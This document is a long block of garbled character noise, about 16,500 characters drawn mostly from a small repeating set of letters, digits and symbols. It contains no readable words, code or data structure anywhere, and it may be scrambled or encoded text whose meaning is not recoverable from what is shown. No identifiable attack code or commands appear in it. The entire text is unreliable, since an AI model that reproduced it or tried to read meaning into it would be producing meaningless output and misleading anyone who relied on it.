1r>8rbcIStI-884rI1ItIJSI-> -Q84->8r(r-t(IrIDI1I>DrD1O SDvUScx(441 (4t18Utr81lt(I t4IrvcPt(D(>8I11>cSU8SEv(t#c4 -r- v(( IUDv-cv1>1U8vU(S4vr>4c>rUUc4 !1UDctvrs1vU1c> U8t88+Z1St-S81>t1SS8vK  8J-4StrhUID>v- vOS vc(44v>D(v4vD&-4v1-t rDtc1*S(SSIr>S4r>4vrv1UtFc4 1ct -481ctDS4I(S-DvrU1c4 1I(>-1O1Ir>U-SvvU v((-44DI(U4IDvU cHS8c>(D4>1 UtcS1Mt8c1 >rU(8n81StcS>11>8SU8S}v8(rrD8>>Srvc_rItDc(_44>1->vUc-ct S4rS4S vD >r8-vSvcr8(rrDrtDrt4IvU8IUItvUuI4>S8vpUIRt4S1-I-v8rxt4+DvO441>>-UvSc1c-(IIrD>Utc((>IS1(UrS j14D1>t>rv1Dtdc4 18I8Or-ISt8S8v X(I18U((Iv> -}U>-D8IFt4 tv-4v( -4(D1(DcDr54Ur_42IIc4vUcS Ur 1<U4I8UDS(8>t-48D 1>>DIDr8DDv I >-S481F> U( IcDD-cc{(r->v>(S4vD Ivt4(r1SI-1t-vSWIvS2v>cI UrS1vt Sl 4r1:>tUS>8vB Iu4D1I>8-SISD(- vh_4 r,r4v>D--cSI,1%DDUIcD(Dr-cc =44D1U>cU-S-U2 tASv 1r>1UIt>>>vS(8DO(SID>ISrc4 cDI-4Itt>D-Svv( 4x>4-18>c-4S1 U cb(48  8rSD>S>cD8 h(IYSISQ rKd1S8nhc11t>SUU1St8c(vII>48I8c>S-vv   -c>1->vU 44vD U6SA -4>DtUSSA  rkD4>1cD Ur-1vt8S)8-r14>>4SS8c_ I(t4U 8> UI>>v-8vYZrI11c-USS 14 D(-4vI(>eSDS>vSr Y4rD1UDcU8crv1 DUc4 Ir>1>tSSv8 Y)4tt1S>8UVSIv>v-ov c>ID>U-St4( 4(>4t1c>(U4DDvUScL s4111c cS Dr I>U4c1 >rUIrtvS-8w6c11t1SU814DI >cS4v1L>It>S-cv (v 1>I->vU S4vD8Ufc S>4DDUUS>4  r(D4>1S> UrD1vtSSOcIr1I1S SS8DC 4Zt4S18>fU4r>v--v9(cI1>1-Uv14I4 Dc-4>S(>4tDSUvc  v81DIU>cUUMrv18tb-4-(r>1ItSSU8 (+14D14I8UTDIv>--pS-n1r>D8-Svt( 4c>4Urv>8UrUDvU-ce 8411XUUSU8Sr 1SU4U  >rU1S>SS>8.#c111SSU8S7vr D(S4v8K>Ir>S-4v   4>>1U vU (4vD U2S}4 4>1(US-(  rwD4t4SI UOi1vDvS_ 4r1I1DvSS8rK I4t4S18>(>4I>v-4vy8 I1>>-UcU U4 DI-4-t(>4UDStSSI Cr1D1trcU SrvIvtDc48Dr>rStSSv8 ( tUt1->8U IIv> -NcoISI>Dt-Svt( 4_>4U4-r(UrUDvttci(44111>vcS8-r 14U4c1 >rU4(tvSt8d((11t>SU8S(SI >SS481T>It>St>c8(^48>1>-vU(-4vDcUwc S>4DDUUSU(  r(D4t!>U trS1v41SQ rr14>IISS8>: Ivt4UD8> Ur->c-Uva(vI1D1-UcU(U4 D--4-1(>4UDS>vcI ercD1t(cU8ervIv>Uc48vr>1rtSSv8 ( IPt1-88UNIIv> -ic<((I>D -SS1( 4w>4-1cI(U4IDvU1cx l411MI>c- >r (>U4cI >rr1StUDg8(r411rvSU8-Evr 4cS4v ^>I1>St8v 8788>1UovU(14vDSUWS%8S4>DrUSSa  r#D4>1-S UrI1vttS7c8r14>>SSS8Du I-t4UI8> UI1>v-tvR(cI11>-USS >4 D--4c8(>2-DS>vcv prcD1t(cU >rv1 44cr8 r>14tSSD8  5(8t1-d8U}1Iv>8-{Sv81ID>4-St4( 4(>4>-v>(18vDcU cx-U41DDUUSU>(r 1SU4-r >rU1Stv>t8(Kv11tDSU8-lv4vDcS4v P>r4>S-vv 894(>1U(vU(>4vI(UkS48{4>DrUScD  (1D4U1-v Ur41vt S^ 4r11>>tSS8DF I-t4-v8>%U4U>v-Uv0(%I1>D-UcUvI4 DS-4cv(>4UDSUvSD WrvD1UDcU Urv4 tvc48 r>14tS-c8  +Ict1-R8U;1IvD4-{vvfrI>>4-StS( 4(>4-Iv>(18vDcU cQ-k41DDUUc>- r81dU4DS >rt1S>SIr8xsv11>4SU8SWvr 4cS4v O>I4>St4v 8S->>1U{vU-o4vD8UVc((144wSU-cv  v>D4UIc>vU8D1vtUSs8 r1I>tUUS-tC ISt4- 8> (IS1>_4v3(vI14I-Uv-(v4rDlU t>(D4UDS1-c  (441 t1cU Srv11t;cr 1r11Ut>D 88VO14>SS>8t^SIvx>-J84o1ID>U-Svv( 4W>4-1v>(t4SDvU c/ (41D>UUt4t8S 18U4c1 >0>v8tvS 8arr11t>SU8S 8I8>eS48IC>It>S-v>>(bI4>1-DvU(S4vD U0v4(14>12UScv  rf14U1c> U8-8t^S1rv4v  D}>I8cvvv8r((Irtr-DISD(- vBZ4 r0r4v>D--cSIj1%DDUIcD(Dr-c  844D1U>>(t(cc1 tSc4 1r>0DpcI tUSt8ct1S48U3SIv(tI(>-UjI>>>-Svv( 8rrc-1c((U4SDv4tDct c8(rrS11 vr-1CU4c1t>cD -du14vcr411t>->D8uvI >!-881k>IU>S8Iv (%I4>I->v>(S4>UDU+v4(1r4DUU-cv  rO1 I>cD UrSIUt S( 4u4v-tUSS8v<tI_t4S18>I(IS>v- v(34I4>>tUUD(v4 D*-4v1(44UIS1tc  K44D1U>ct Sr>>ttsc4 1wc1Ut-Sv88bhI 4>SD8U&SIr> -(84(C U>t-Svv( 47>r-1c1tc4SDvU cS(441D>>UtD vr 13U4c1 1rU418*S 8,r411t>St8Sb-I >vD18IF>IU>S-vv8(;rE t->vU(S41D UMv4  (8DtU-cv  r!DrU1cD UrS-1t Si 4r11>tUSS8vP4I<t4S181^UI->v-SU4KrI1>>-UvS(c4 D=4Sv1(>4UD-Uvc  i44DIU>cU S v1 tbc4 1E>1UtSSv->-c8DrIIU>-Sr8UrvIr>IUG >kt4UDU(c4K>4-1v>(U4S1v1 c81Dcc4vUU SItItrrU4S  >rU1SI->U> cr8trrSUv(evI >)D>>DSI8t( 1v>4-(c-((41vD SctI(3XI>>rt1-UUScU  r?D44TDr>#S>1vtrSB 4r1(IrII ttScvvD4>4>t-DvtXt4cv.( I1>>-Utt-Ic1(c-4cc(>4UDSrD1(t ct rr>DtUtct1 tvc4 1r>8rr-1I>Sj(14t1-G8UHSIv4cI1>--(vU(1-Sv-( 4h>44>>rUr4SD>U cg(4vD(tIcD-UISo1mt(c1 >rUXr%->88x%Q11t>SUU>cvI >tS481^> xwDIc>4UvvS44IDD>(tt((D>>v441trtrvccv vrwD4U1DtSrrtII>Svv0I-8>48> v8vR-I.t4S1U---8>0tI4v&( I1>>-U>I-cvr(c-4c>(>4UDS1>DDU4c j r81>ttSUEcrU1-tUc41UtISv8 J{(85>1Dt>- 8t<S-?v4=1I>>UD-DtUSvr141 >DU>c8Iv1vDrt(cr(rrDcS >r 1LU4trttSS 1rI1t8P2t11t>SU-IStvS48IS>c-S81(UItDw(8DI1 crv-UrS(t-Drc((14>DUUScv  4krIUrc> UrS1vt DfD 811>tISS8vx  vp-4f>SSIIS>D- vF:4v8:r41>I-tc% S-4c((>4UDSrvD8UtS+ rU>cr Srv1 4_1>UI-8 I!UI-8 _t14t1S>-DS48c(vI(>(U68r(>-tvv( 4B>4-1v>(U SD-8I(>4 SD8 S1rUS rccU8(cL4tUU-c84 X88DTSSSDS-IIr18Sc4S48rT>IU>SDI>I-(4(11r>--rS>v>v1?U4(1r(DUUScv-Ucc (Xy1tt> t1-vc8(S-8D;r811I-vu Itt4S18>S-8c4t42>c-Dvcxr4DvS(14 Dl-4t1UtcD(rrUDDUrc1D1t8cU Srvhrr(1ct>S881CD1Ut-%fI t1S>8Uc88c=DI4t1^1I>>UUUID( 4s>4t4v>(U4S1StvcJ(r41I(UUcS v( IDU4cI >rt1St4S c7((11tDSU8-^v4(>#U48r?>It>S-cv 8II411U8vU(-4vD8U=cD(1,>I3UScc  r(D4>Uc> U(41vt8S28Rr11>tUSSvrH I&t4S18>o>IS>U1;v(g4I1lc-Uv-(vk 16-4c((>41DStvc 8 DUD1t(cU81rv1 t3c4vcr>1ItSSD8 f 14> v88UTDIvrI-78rf1I>>U->t (84p>4I-v>(t4SIvt co 841D4UUS4 v#vU>U4S8 >m>1StvS 8?(-11trSU8IavIv>0-v(cP>II>S1rv ((I4>1->v1Sv4cD U2>t(14DDU>Stt  rcD4t:c>8>rS4v(cSW88r11rtUtS8v  Ivt4-(8>PIIS1v- SF(SI1>r-UvD(v4tD^tMvr(>44DStcc  _4414t cU Irv1StZc4 1(>4(tSSD8 +-14>>S>v>(DIv>>-AS>w1I>>UUUJ>( 4t>4>Sv>(U4S1StrcF U411lUUcS viv11U4S- >(c1StvS v l>11>SSUcI:vI >EUGv>l>4c>SU-v (&I4D4-1vU v4vIUUOv4(1r1D4USS8  )4D4U1c>8>1T1v> S%v8r11>tU-Ur4H 4(t4Sr8>?UISDS tv& TI1I -UvS(vrv18-4cr(>jcDSUvc  Mr>D1t(cU8trv1 t0c4vtr>14tSSv8 <(141 S48UKDIvrI-)8r^1O8>U->t (84V>4I-v>(t4SIv1-cR v41D4UUc- v( 4(UrS  >r41StIS v P(11>(SUS(zvI >WU4v-P>Ir>S-Dv (4I4D4tSvU(44vDvU_v4(1r1IcUScI  r D4U1c>8>:I1vt1S?c8r11>tUSSvUA I-t4-S8>,>IS>>1vv((vI1!c-Uv-(v4tDoU t>(D4UDSIrc  (44I11rcU 1rv1St!cr 1(>(ItSS>8 *S141>S>v>(tIv>t-Eccd1I>>UtSc>( 4->4U8v>8D4SIvUSck c411(UUcD v( I-U4S8 >rr1SDUS cYF811>(SU8I3vI8>%U4cSl>Ir>S-Dv 84I4>1IUvt(14vDUU:cc(1{>rIUSc>  rSD4DDc>v4r81vtUSu-Kr11DtUUc8v}S(4trS18>v>IS>c- vvc1II>>-U>((v48D9tA1t(>44DSUrc  644D1I(ct 1rv18tncr 1Q148tSS>8 ((14t1S>cU(1Iv>t-_v s1ID>UtScc( 4->4U8v>(14SDvU-c; S41D>UUcS vr 1IU4S8 >rr1St1S 86(*11>mSU8U;vI8>:UO-c6>I4>Stcv (,I4>1U(vU(14vD8U^c6(1f>1SUSc>  rSD4>-c>vUOv1vtUS)8vr14vtUS184G ISt4DI8>CtIS>c- vvc1II>>-Ut-(v48DaU t>(D4UDSIrc  (4414x-cU 1rvIStic4 1(>RItSS>8 *S14>vS>c4h-Iv>U-LtvW1ID>Utrvv(S 4>r-1v>S44SDcU cvS14ID>UUD( vr81g>4>( >r41StUS v r441IrSU81,vIU>,U-818*It>S->v SDI4>I->cv(S4UeKU(v4(1vcDUU-cv S84DrU1c>S>rS1ct SSvFr11>tU-z8vR8IE>}S184cSI->v- v>b4II>>-U>4(v4 DQ-rv1(>4UDSUvc  /441vU>cU Srv1DtOc4 18D8IA>I8c vS rK4I-8U?DIv> -jUc-(vU( Irvv(-4l>4-1D>-Dv- =44c_ c41D>UUDIUtSS -r81>>5rU11tvS 86v(8DLU14trSDI > S481,>8-4I-vc?(2I4>11I>IU vt(crvS4Stct Srt1UU-S D4tjc> UrS8Dr81t> ((1>tUSSvS-rIgt4S1v EUIS>v- ?tJ4I1>>-tvS(S4 DSc-v1(>4U1>Uvc8 T44D1U4>S -rv1 >vc4 Ir>I>(8Sv8 e2I t1S>8U2StI> -Z84<II>>>-SSvc-4W>4-1v>(U4DDv> tc(441D>UUcS cr 1SS-c1 >rU1StvS88or411t4DS8-_vI >)S48I5>4> 8-vv (<4v>1->vU8S tD Ukv4(14>DrUS-> 8rjD4U1St Ur-1vtvSO8 v>1DtUSSv8_ I(t4-HUU{tIS>v- vy0rI1D1rcvS(v4 D8-4v1(>44IrUcc8 a44D1UDcU -rv1 vUc4 1r>1UtSSv8 HQI>t1S>8U#UIv>8-}v c>ID>U-Svv( 4(>4-1D (U4SDvU8cx(441D>UtcS vr 4rU4c1 >rU1ItvS 8iSc8(&41rtD- vU>H--819>IU4tI1>8U 8ror44>IUU4vDcU;v4(188 D1-cv vruD4U1DtSrrS1rt S/ 4v8 r.1>tt1SD81M I4tr-SIS>U- vYF4c8#D4(D>(v4tD%-4v1crcS(-4SD4Ucc D1UIcU Srv8/rcIc 1281UtSSvt(cr(8e>1r>cSr8t(c-3v8;1I>>U18D8-Svc(>-rDIydtSc8>?IDI4 DD>U4cS vr h8rI1>tiS( ItvSU8Br411rt1-U8Sc8Db4S4vcd>IU>SD1>--(v> _4 U>--cSDckU}U D >8 cDrr4 r_1 U1c> Uv> t9>Iv 4y81>tUSSU>S-88( ID>18DIS>t- vg+48Z(841D -t4cDZ-4v1(>XU-c Dt  8S(>v8>r-vv-rU vrS( vcv>1rc>44I4rCIt1S48U5SIv4rI(>-->I>D(-Svv( c-(I44DcUDcS(c4cDc(4rcD>UUcSScS-8vrI-1-%ct8Um(S 84r411t>DDtD-f8-+84 c1c-v-(v4-DS-ccm>rDScS84 vSDDStcc14>1(UScv  8I(rr81Ut(S>8trS1c8(Stc1 1Sc8 ,Ic4I1Sr;I>4cD 8v >Dtrt>>>USvS(v4 rS4-D>-4 4(rrS1ctv8( vr81vU>r-(tctxUpD1Dv4 t> 8 (d14t1S>UR-Dv(b8I4>I-c84r>4cD8US8<!r44D4(U41DvU c5S(cU 84I1vtUr 1 U4c1 >v1(StvS>8Er4114>I->tSIvSHtII>>m>Ir>S-vv SQv>/Ir8>IUUc-D Uvv4(14>(r4-1(U-rM1vU1c> U8tW>Fv1(tDS(1ItUSS8v5 I;t4c1-tnDIS>v- vTC4 1 4DUvtUI>>S 8I(1Uc-t-vUvc- 044D1r>DtUrSS8ctlS  1r>1U4t1I>1Sc14>-S>8UQS O((I8tr-U >(vI-DI--c D(-1v>(U4SDvU cmc44ID>UUcD vr 1<Ic1(tUS  rr8S 8xr4I48(SU8S{vr1>RS481(14r>S-cv 8cI4>1->SU(r4vD8UTvr(1+(DU>Sc4  r(D4UIc>8crS4v>US_ rr11DtUSr8v  I8t4SI8>btIS1c- S. cI1>D-Uv-(v4-DK-4-v(>4tDSUSc  <44D1>ccU Srv1 tRSx 1r4(St-Sv8 c114tIS>cU(SIv>--uv n1II>UUUl4( 4->4USv>(U4SDvtDcx 8411(UUcU vrUttU4S( >cv1StcS 85r4Ik4USt8Skv 4>/Sr81 >4U>S-tv (vI41>->c>4x4vDtUbc1(14>DUUSSI  rcD4t8c> >rS1>-tS&88r1IrtUS-8vk8I%> D>8D0UISDt- v(P44xrU-tvS(v84Dz-rv18> IDSUtc  v441>U>-U>trv1-t;S8 1(*1UDS-(8 .c14>(S>v>,SrvDt-0v8Q1Ir>UUSvv v4t>4U v>8>4SDvU S 8>411(UU-1 vr 1u>4SD >rr1StDS 8Ur4I4t4SU84;v4c>wS481(1t4>S-Iv  >I4>1->c> 14vD1UZcI(14>DUtUSc  rDD4>(c> UrSIStrSN8>r14ttUSS8v(vI-t4-t8>(8IS>v- c (4I1DU-US8(v4 DTt^S((>r-DS>Dc  *4414cvcU8Srv4DtVc4 1A1t tS-c8 (v14t1S>v>8DIvDv-Xc>k1I>>UUUc-( r8>4t(v>(U4SDvt c9 c411IUUcS vr 1UU4S  >rU1StcS cS(D11trSUS8EvI8>VtI81u4 S>--vv 8II4>I->v1Sv4cD Up>>(14DDU>Stt  rSD4tfc>vUrS4vD8S(8vr1IGtUt(8v(v4ct4-88>(tIS>v- SG(:I1D(-UvI(v4>D9tkSv(>rVDSD(c  +4414U4cU rrv4rtkc4 121IctSS48  -14t1S>8UA>Iv>t-JvU51I1>U-1tS(84S>4IUv>(t4SDDU cvS14ID>UUD  vr81O>4>( >r41StUS cnr4414rSU81uvIU>,t(81(14 >S-Dv 8cI4>1->SU(44vDtU5cc(1x4DU>SS   r-D4t8c>cvrS4vtIS.8cr1I(tUSU8v  4vt4-88>ArIS1v- SL(rI1D(-UvI(vxcDF-4>>(D44DSU>c  -44I11rcU 1rv1UtY-t 1 u1ctSS>8 vv14tIS>SZuSIUr+-(84Q1(4>U--vv(S 4>r-1v>-v4SDcU S tD411{UUc1 vr 1BU4>8 Dr41StcS 8(r4I4>1SU81)vrv>NS481 >41>S-Dv (vI411->SU S4vDtUBcc(1(mDUUSSU  rUD4U1c> UrS1vtvSW8cr1I(tUS48vE 4ct4- 8>6>IS>c- c v-I1D^-Uv-(v4 DE-4S-(>44DSUcc   44I1> cU 1rv1Ut=S> 1(>1DtSS>8 YS14DvS>84 (Iv>U-Rt(u1ID>U--vv(S 4>r-1v>SD4SDcU cvS14ID>UUD  vr81z>AIt >r41StUS 8wr441IrSU81hvIU>7U-818e-v>S->v S1I4>I->--(S4UnsU(v4(1vSDUU-cvv 8cD4t c> 1rSI t Up-8r1IGtUS18v^tIk1vSI8>;4ISO.- v(F4L>>>-1tv(c4 D;I>v1(D4UD>I c8 &44w#U>ct Sr>IvtMc4 1bv1Ut-Sv8v/;I 4>SD8U?SI4> -(84K1v >U-Svv(84;>4-1v>(U4SDvU cU(441D>UUc1 vr 1FI>1DtUcrLr! S 8-r411t>1rtD-U8t5cI1D {>II>S-vv UEv(uI4SDv(S4SD UKv4-D8(DUU>cv  rP8c4I18t1rSIvt S} 48I8rM1IccvvU8((dItc>v>vc(-4c>cU(I1DL-UvS(v c(r41D U8vrDSt(c  b44Xr4r1vUDc-8SDw>{tDSI8DrDI-v-oW14t1-1Dc<SIv> -c84w1I>>U8rvv( 4o>r-1v1(U41UIU c#(4=VD>UtcS vr 1vI1cI >rUI>tvS88z(jvtt>SU8SZSI >hS481I8IU>S-vv8(d4g>1t>UI(S4vD Uxv4 84>IU1Dcv  rGD4U1Sm Ur1tIt S_ 4r11>ttSS8vB Iv41SI8>)UIS>v-8vM sct>>-UvS(U4 DJ-4S1cr4UDSUvc  xrSD1DQct Srv1 trc4 Ir>1ttSSUU9Z(14t1-t8Ud-Iv>SD48rP1I>>U-Svc( r  D-1v>(U4tDvU cG v(cDDUtcS vr 1(U4cI >rU-4tvS 8Jr411t>SU8S(7I >hS484{>It>S-Ut&((I4>1->vU(-4vD 4Uv4(14>DtUScv  rsDrU1c> U S1vt SA8(t}ID>r4Sr>(SvcI4S18rWUIS>v4 >(--v4(I-Uv1(v4 DF1(DUU8vI vrUccc(}n-U1tI(H>tSlLtdS4 1r>1UI-It>SSr444 1D>>-8rv4vIrD(-r8r(D-tvv( 4k>4-1v> U SDvUScZ(441xIr(IMUtr 1SU4c1 >vv8cy 1t-tS111t4SU8SCv S,c4SDflIIU>S-vv (*I4t1DtvDr8St I(rI-r*D4--Ut4Ir1tI-4--G Sv8S1-  (cr4IDcr-1t1-vN ISt4S18>vD(1(SI8>I-8I1Dc-UvS(v 4(r4(>IUS8U  4c1DUcS7D1t(cU Srv trcI t8cr8Ss1S-8 Hi14t1S>UUU>(v> --84!1I>4I4v>c-vv1(84Bv>(14SDvU 1--rcc 4UUcr vr 1J4IDDSrSS D;(1Dtc-(11> SU8Snv  Tr4(>c-4v((c4 v (vI4>1->tc--vI 3U:cO(14>DU4ctD crsD4U1c> UrS1vI S78-r11>tU>4ttS881( Iv-1StvU>-4rtc vt1 8c14UI 4 Dc-4v1(>81(rrUD4Uc44DrU>cU S8I8cI(S(r<cS>Urcct-844UIt1->8UzSIv4>4c>DSIvU(-Ir>USvvr(Ir?t>-tcU UU c (441D>I1>S vrt1xU4c1U)cI twUI(> 8(1r--4ID(>8cD-vv -D*>4c>S-vv S8v8(UIr>DU>;vrv4r1(Urvr DUScI  r<D4ItDDUrSv I&SIct S(1DtUSS8-R I{t4I>tr-rIt8 -evcU4  >I :Mv(vr<DE-4v1S2c( v4UtUUtSp rr4tDU4cI 4rvc48-r>1UtS>Dt--v((zvI8>vS>vSd-I484((I>>U-St(U(vv(84Uv>(44SDvU >r-I8t(Dr(1v vrU1zU4c1SIS-8vr>1Dt-r4Ict>SU8Sv-8>k(4/tISIv1LD4Sv (tI4>1->DrUccS(Ir8D4-IvI(IUtrc D :I4U>1-Dr8v1vttSs 4r1(>)v1->IS-v ((S184iUIS>vIt>(-Dv(aS-UvS(vrvv--4v1(>4>DSUvc 8 ? D1UDcUcSrv1 tX-4v r>1ttSSc8  I14D1U88Uz-Iv>8-*SUx1r>DD-Svc( 4(>4t_v>8U4-DvU8cy(r41DIUU-S8rr 1(U4cI > L1StvU>8!rr11t1SU8SGvI DDS481l>IU>S-Sv (v 1>I->vUSr4vD8UsS4 14>DIUScU  Z1D4t4 v UrI1vDDSx 4r11>D(SS8ts I-t4S48>+4DI>v--vE(4I1>D-Uv-(v4Sr4-rv1(>rUDSUcc  v81DIU>cU-rrv18t2-481r>1ItSSU8  -14>48v8UBIIvDD-L84A1I>1(-Svt( 4->4-4v>(4DrDvU-c.--41DDUUcS vrSs4Urc1 >c(1StcS c:v811trSU8>%v4D>FU4Dre>II>S-tv  SI411USvU(D4vD-U#St(1/>1UUSct  rcD4tcc>8>=c1vtUS&vIr11>tU-Uv85 I-t4->8>/UIS1vU(vZ(cI1D(-USD(vrvDS-4cv(>4tDSUvc 8 DvD1t8cU8 rv1 t7-&vSr>I tS-(8 Hj14>4-48U((IvDr-X84)141DI-Sc&( {S>4-1v> >rrDvUrcf8r41D>UUSU8>r 14U4-S >rU1S>S-U8AyI11>vSU8S;v4vS>S4v1_>I1>S-vv   >U>1UDvU (4vD U_SPI84>1>USU   r!D4t4cr UJt1v>rSd 4r11>D SS8Du 48t4S18>CU4->v-Uv_+4I1>D-US1 >4 Dc-4>c(>4tDSU1c  v81DIU>cU-rrv18tz-4-(r>14tSSU8 (414D1UD8tb1Iv>U-9vc!141DS-SvD( !k>4-1v>8UN}DvUtc+ c41IrUUSU tr 1UU4S  >rU1S>S-88uY-11>0SU8Sfv4vDIS4vSP>rl>S-vv (prt>1U(vU n4vDvU)cvS44DD4US>I  r(D4t8c> 1vv1ct S_U-r11DtUUS-tN ISt4-B8> SIS1v1-vN(vI1D)-UcD(vrvDt-4c8(>(UDSUvc v&r(D1t(cU Irvr(t*-48(r>1rtSSD8 hr14D1-c8UWIIv>t-6S>s1r>DP-SvD( 4->4t>v>8U4tDvUtc} c411rUUcSU r81SU4S  >rr1SDv>-8o{v11>dSUctYvrUIpSrv u>8(>S-cv  (I4D*1Uvt(S4v9DUGvr(1r18cUSc>  l8D4U1c> U8I1ctUSn rr11DtU-Uc/: ISt4UD8>PUIS1v-8v_(cI1>4-USv(vG Dt-4c8(>4rDSt c  0JxD1t cU Srv1 t{c4 rr>1rtSSD8 aU14t1-r8U#1Iv>v-28r91414D--v>( rX>4-1v>(UrvDvUUcK(r41D1UU-S8tr 1SU4S  > 81SDvS>8d*v11>OSU8D%vIUDvS4v Z>8(>S-cv (FI4Dg1Uvt(S4vgDUsvr(1r18cUSc>  9-D4U1c>vU8D1vtUS:8vr141tUU18c3 ISt41(8>2tIS>1- vvc1II>>-UtD(v48D3U t>(D4UDSIIc  (44I11rcU 1rv1StP-- 1(>?ItSS>8 yS14>4S>c4> Iv>U-YUd*1ID>Ut>vv(S 4>r-1v>c>4SDcU cS8=41D>UUSs vr81utBc1 4vS1-tvS 8>r41It>SUt4WvI >LSr81.>IU>S-vv (AI4Dv->vU(S4vDDUHv4(1 D Ir>18v 8S(rr41- Ur11vt Sh-SS( D*41D> l Ict4S18>-U8t)cI4>1V4I4>>-UvS-8 tD_Ucv1(>4U(I4t1SU-c8 >;AcU8vrv1 t%D(t(SS IrtIUc vI8IF>II>1SDvS> -S84+1I>4D4cD -Uvt(c-1v4(U4SDvrtD(U-SH1rUUcS v_v8IU4c1 >pZ1StvS 8F1-11t>SU8-,vIv>K-v(cs>IU>SUUv ((I4>1->v1Sv4cD UQS (14DDUtUI(  rGD4t(c> UrS1vcDS% 4r11DtUSU8v  (ct4S18>KUIS>D- S%c8I1>>-UvS(v48D^Uv c(>4UDSUvc  (44D1U>c1-vrc1 tBc4 1rD1U>U4(8 :_14>&S>8UnSrv4--w84C1I>>U-1vv8U4(>4-1v> -4SDcU c (4rVNUUtcS v6(1kUrc1 4vS1-tvS 8+r41It>->D8pvI >x-(81o>IU>1tIv8((I4>1->vt(S4cD UPeS(14>DUUScv  rxD4tUc> UrS1St S( 4}L(UttSS8vs IytrS18>-wIS>v- v(K4I1>>-Uv-(v4 D7>Iv1(>4UD-Uvc  U44D1U>>UtcS- DRv1-tDSU1D>c1U UIr81vUvDr-;SID> -X84-88r(1II>tUlcS>4-rv>(U4S  4-1-(4r;D>UUcS--cD8>r8c18>rU1Stv>>>cSD IRUI-trSU vzrIIDQc>8t(U4Uv (tI4>1->DrUccS(Ir8D4-IvI(IUtrUvSr7c4D(4DUrD81vtSS: 4r1(4rII4>U* Itt4S18>S-8c4t4f>c-Dvc%r4DvS(U4 DQ-4D8-Dcc(DUvcU O44D11I1-tvc> Dr-c488r>1UtSDvt4S(v-y(I1>D{S4 > -284cr8r(vID>-USyQrD4DDUUDc>(trvc8(441D>UUcS vr &+U4S8 >rU1SItIot(Sy8Urr118tD1 1I(}4-SD-1 Sc-vv-(RI4>114D(U>cR(-UCcf(14>DU4ctD  rvD4U1c>-cc- IRKS8>8>I(t-UDc>* vpIt4--8>_UISr<4(>8SrvUr>4v>-UIv-  -4c (>4UDS11D-U(Sv (rUcD Srv1 twc4-1-40UtSSI8 RM14IrI tt-U8cAc4v>8-4II*vU-S-t -1>1I1n-(U4DDvU ceSDcD(44I1  vrD1nU4c1SDSI8>d8U -Scr84j-SDcSUva(U. 4 4v>(U>S-Sv (QI4nQ1>vU(I4vD Uw>vU(vI 1rc1Sccr8D4U1c> UrS1vU tr 4: 1>tUSS--S48ty8I>>4fD(4vc S8rSS4v(-8cvS(>4 DV-4>D-t8c(-4I1/ Pr1D1U>cUS1cI8arv>vtcS18DK>>-t>St8>0NS>8IeSIv> 4Ztr-cv1(D-Sv>( 4R>4Drt0U>v- (4-c8ISvS4D Ut9I(I1rrU4Sc >rU1SI11-t(S>v7T >>t--SI >vS481n>vry-IIDS(R4t>1->vUcIvt S18DSUccS(1rUDttar8IIS-U1LU  SDrD>K 4rr1>tUSS-I-c((t4-c8>EUISr(I8>--1vc(44I>>-t4cI8-((v8t(1118S( -r44D1U>S>DIrv1 tVUv 1r>1U>U--8 &(14>US>8U)Srv>--V8re1ID>U-4vv8 4 >4-Iv>(t4SIUU -P8 41DDUUc- vrI1j>4St >rt1StcS c r441>(SU8-{vI8>3tt81E>{5>S-cv ( I4>1->vU8(4vD URv4(141DUU>>  8rfD44Uc> trS4v> Sf88r114tUt88v(vt>t4-88> vIS>v- vO -I1>r-UvI(v4vDyUv c(>4IDS4oc  (44D1U>c1-vrc1 tFD> 1rD1UDS-v8 oc14>hS>cIOS4SS1-<vcd1u8>U-Svv( rt>4U(v>(r4SDSU cShc41DrUUSD vr81YUrc1 4vS1-tvS vcr41It>S1Uv2cI >j1>81,DIU1SDtv (cI4D+->-((SRv8cUAc8(14rDUtDcvv )(D4t(c> IrSI-t U08vr11rtUSD8v21IVDC-c8>Q4IS18- vPR444>1-UvI(vktDG-4v18>r-DSUDc  -441(U>S>8>rv1>t0U> 1r>1U>U >8 wt14D>S>8U3S4SD>-ZvUp1wt>U-Svv v48>4U-v>(D4SDvU S 8(411SUUcr vr 1X>sS4 >uc1S>SS 8<r4I4>>SUvvxv4U>oS481(14>>SU8v 8(I4>1->c>4o4v1 U*-((14>DUtU(4  K(D4Dvc> UrSISvtSPv*r14ctUSS8v(vIvt4-r8>2DIS>v- vk cI1D(-Uct(v4 DV-4c>(>44DSUvc  (444 U1cU Drv(4t7cr 1( 1Ut>D 88CR14rUS>8tRSrv4--Zvvf1I4>U-Ivv8 h(>rU v>(44SD>U S  1411(UU-S vr 1/>4S1 >rr1StDS 8cr4I4>tSU84Yv4 >+S481(1I>>S-Iv  7I4>1->c> _4vD1U2Sr(14>DUUSSc  r-D4tSc> >rS1>4vS(8vr1 StUS-8v{tI#> D>8DpUISwX- v(d4r14r-Uv1(v4SD#Ucv18>8IDSU>c  S44D4U>S>8Srv1ttFS> 1r>1UDS-I8 C-14>8S>vSXSrvDv-Pvch14(>UUIvv8 r->4U8v>(r4S14U -C8 411(UUcI vrt1/>4Sc >rr1StDS 8 r411rUSt81uvIU>y-c81 >(I>S->v (SI4I>->S4(84vDUUyt((14DDUtrcv S84DrU1c>SDrS1ct Sv-1rI1>tU1 8vL8IODj4t8>J4IS14- vPb4I1r(-tv1(v48DC-rv1 1rvDSU>c 8r44D1U>-U Irv1ttGS  10(1UDSSU8 #-14>8S>cr=SIvD8-/vS/1I>>U-Svv( 4I>4U8v>(r4SD1U cn U411=UUcU vr81Z>itc >r41StUS 8gr411t1SU81.vI8>x-m81 >It>S->v (SI4Dt->SU884vDUUjcv(1?-DUU1SU  rSD4I4c> trS1ct Sv-1rI1>tUDU8vs8I6> D>8DWUIS0<- v(l444 --Uv1(vrSD,-4v18> IDSU>c  S441DU>-4 -rv1UtRDc 1rD1U>4Sv8Sv41rt1S>UrwSIc> -vU1NII>>UI vv(84z141(v>(44SDUU -t(4h1rrUUc1 vrU1Ftrc1cOrt1St>S U1r41It>St8STU m>(S481SSIU>--vvSc4Ir>1->UD(S4cD USSJ(14>DUtJcv 8rK1XU1c4-Sr-1vt S> 4rI1>tU148vb I6trS18>+UIS>v- v/h44v>>-UvS(v4vDV-4v1-t rDSUDc  Z44 84r11UIct8OHSc48pr>1UtSIDt8Stv t1Sr8U+SIv( I8tr-UvS>UU8vv( 4?d(4(DS-Ivt U> t UIcr I4I1t v! 1#U4c1SDSI8>O8U -Scr849-UU-U-8vc(8I8>rx>I4>S-vv 